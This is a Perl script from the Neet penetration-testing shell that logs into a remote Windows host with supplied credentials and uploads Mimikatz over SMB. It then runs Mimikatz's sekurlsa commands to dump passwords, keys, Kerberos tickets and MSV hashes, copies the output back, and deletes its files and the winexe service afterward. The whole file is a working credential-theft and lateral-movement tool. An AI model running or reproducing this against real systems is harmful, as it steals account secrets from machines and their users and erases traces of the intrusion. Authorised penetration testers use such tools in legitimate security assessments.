#!/usr/bin/perl -w

##########################################################################
#
#    Mimikatz: Run Mimikatz remotely and locally parse the output
#		 This is the version shipped with the Neet shell. 
#    Copyright (C) 2008-2016 Jonathan Roach
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    Contact: jonnyhightower [at] funkygeek.com
#
##########################################################################
BEGIN {
	unshift @INC, "/opt/neet/core";
}

use strict;
use JR::Files::Config; # For finding locations

my $UPLOAD="/opt/neet/upload";
my $locations="/opt/neet/etc/locations";
my $winexe=getPath("winexe");

my ($host,$user,$pass);

if (exists($ENV{'IP'})){
	$host=$ENV{'IP'};
} else {
	$host=shift(@ARGV);
}
$user=shift(@ARGV);
$pass=shift(@ARGV);

if (!defined($user)){
	print ("$0\n");
	print ("Usage: $0 [<host>] <user> <password>\n");
	exit 1;
}

if (!defined($pass)){
	$pass="";
}

my $WorkingDir=$ENV{'PWD'};
my $REMOTE_DIR="_mkz";
my $ERROR=1;
my $OS="Unidentified\n";
my $bit=32;
my (@FILES,@RESULTS);
my @TEMPS;

my $banner="*** mimikatz -> $host ***";

print "-" x length($banner) . "\n";
print $banner . "\n";

# Compensate for slashes in domain\username tuplets
if ($user =~ /\w\\\w/){
	$user =~ s/(\w)\\(\w)/$1\\\\$2/;
}
# And for quotes and shell expansions in passwords
$pass =~ s/([\"\$])/\\$1/g;

if (!authenticate()){
	print STDERR "Couldn't authenticate.\n";
	exit 1;
}
if (rmkdir()){
	print "*** Failure to create remote directory. Exiting.\n";
	exit 1;
}

check64();

@RESULTS=("passwords-${host}.txt","tickets-${host}.txt","msv-${host}.txt","kerberos-${host}.txt");

if ($bit == 32){
	print "Deploying 32-bit version....\n";
	@FILES=("mim32/mkz.exe");
	uploadFiles();
	print "*** Running Mimikatz...\n";
	rexec("mkz.exe privilege::debug sekurlsa::logonPasswords sekurlsa::ekeys exit > passwords-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::tickets exit > tickets-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::msv exit > msv-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::kerberos exit > kerberos-${host}.txt");
} elsif ($bit == 64) {
	print "Deploying 64-bit version....\n";
	@FILES=("mim64/mkz.exe");
	uploadFiles();
	print "*** Running Mimikatz...\n";
	rexec("mkz.exe privilege::debug sekurlsa::logonPasswords sekurlsa::ekeys exit > passwords-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::tickets exit > tickets-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::msv exit > msv-${host}.txt");
	rexec("mkz.exe privilege::debug sekurlsa::kerberos exit > kerberos-${host}.txt");
}

gatherData();
cleanup();

my $credit='jonnyhightower [at ]funkygeek.com';

print "\n" . "-" x length($credit) . "\n";
print $credit . "\n\n";

exit $ERROR;

#------------------------------------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------------------------------------------------------------------------------------------------

sub authenticate {
	my $return=`$winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;

	if ($return =~ /NT_STATUS_LOGON_FAILURE/i){
		print STDERR "Logon failure\n";
		return 0;
	}
	if ($return =~ /ERROR/i){
		return 0;
	}
	if ($return !~ /Windows/i){
		return 0;
	}
	if ($return =~ /Windows NT Version 4.0/i){
		$OS="NT4";
	} elsif ($return =~ /Windows \[Version 5.2./i){
		$OS="2003";
	} elsif ($return =~ /Windows 2000/i){
		$OS="2000";
	} elsif ($return =~ /Windows XP/i){
		$OS="XP";
	} elsif ($return =~ /Windows \[Version 6.1.7601/i){
		$OS="7";
	} elsif ($return =~ /Windows \[Version 6.1./i){
		$OS="2008";
	} elsif ($return =~ /Windows \[Version 6.0./i){
		$OS="Vista";
	} elsif ($return =~ /Windows \[Version 6.3.9600/i){
		$OS="2012";
	} elsif ($return =~ /Windows \[Version 6.3./i){
		$OS="2012";
	} else {
		$return =~ s/\r//g;
		print "UNRECOGNISED OS: \"$return\"\n";
		$OS=undef;
	}
	return 1;
}

sub rexec {
	my $cmd=shift();
	my $rc=system("$winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
	$rc=$rc>>8;
	return $rc;
}

sub silentRexec {
	my $cmd=shift();
	my $rc=system("$winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
	$rc=$rc>>8;
	return $rc;
}

sub check64 {
	my $arch1=`$winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ECHO %PROCESSOR_ARCHITECTURE%\" 2>&1`;
	if ($arch1 =~ /AMD64/i){
		$bit=64;
	} 
	return 1;
}

sub cleanup {
	print "*** Cleaning up the remote host $host...\n";
	# Clean up the winexe service - delete the service
	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
	#silentRexec("cmd.exe /c net stop winexesvc");
	system("$winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
	for my $file (@FILES,@RESULTS,@TEMPS){
		rdel($file);
	}
	return rrmdir();
}

sub gatherData {
	print "*** Retrieving data...\n";
	for my $file (@RESULTS){
		download($file);
	}
}

sub upload {
	my $file = shift();
	my $remote = $file;
	if ($file =~ /\//){
		$remote =~ s/^[\S\s]+\/(\S+)$/$1/;
	}
	my $rc=1;
	if (-f "${UPLOAD}/$file"){
		$rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"PUT ${UPLOAD}/$file $REMOTE_DIR\\$remote\" >/dev/null 2>&1");
		$rc = $rc>>8;
	}
	return $rc;
}

sub download {
	my $file = shift();
	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"GET $REMOTE_DIR\\$file ${WorkingDir}/$file\" >/dev/null 2>&1");
	$rc = $rc>>8;
	return $rc;
}

sub rdel {
	my $file=shift();
	if ($file =~ /\//){
		$file =~ s/^[\S\s]+\/(\S+)$/$1/;
	}
	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"DEL $REMOTE_DIR\\$file \" >/dev/null 2>&1");
	$rc = $rc>>8;
	return $rc;
}

sub rmkdir {
	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"MKDIR $REMOTE_DIR\" >/dev/null 2>&1");
	$rc = $rc>>8;
	return $rc;
}

sub rrmdir {
	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"RMDIR $REMOTE_DIR\" >/dev/null 2>&1");
	$rc = $rc>>8;
	return $rc;
}

sub uploadFiles {
	for my $file (@FILES) {
		if (upload($file)){
			print "*** Failed to upload $file\n";
			$ERROR=1;
			last;
		} else {
			$ERROR=0;
		}
	}
	if ($ERROR){
		print "*** There was an error during the file upload process.\n";
		exit 1;
	}
}

sub getPath {
	my $bin=shift();
	my $binaries=Config->new("$locations");
	my $path=$binaries->GetVal("$bin");
	if ((!defined($path)) || (length($path)==0)){
		for my $dir (split ":", $ENV{'PATH'}){
			if (-f "${dir}/$bin"){
				$path="${dir}/$bin";
				last;
			}
		}
		if ((!defined($path)) || (length($path)==0)){
			print "Error: couldn't find path for $bin on the system\n";
		}
	}
	return $path;
}

